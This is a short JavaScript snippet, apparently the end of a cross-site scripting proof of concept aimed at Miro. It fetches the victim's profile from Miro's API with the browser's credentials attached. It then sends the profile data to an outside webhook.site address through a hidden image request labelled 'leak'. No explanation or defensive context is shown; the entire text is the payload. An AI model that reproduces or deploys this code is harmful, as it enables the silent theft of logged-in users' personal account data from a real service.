fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include"
  })
    .then(res => res.json())
    .then(profileData => {
      // remove unwanted keys to not overload
      const {
        achievements,
        subscriptions,
        toolbarPlugins,
        interests,
        betaFeatures,
        ...slimProfileData
      } = profileData;

      // reducing profile via image beacon
      const img = new Image();
      img.src = "https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea?leak=" +
        encodeURIComponent(JSON.stringify(slimProfileData));
    })
    .catch(err => console.error("Profile fetch failed or blocked:", err));
})();
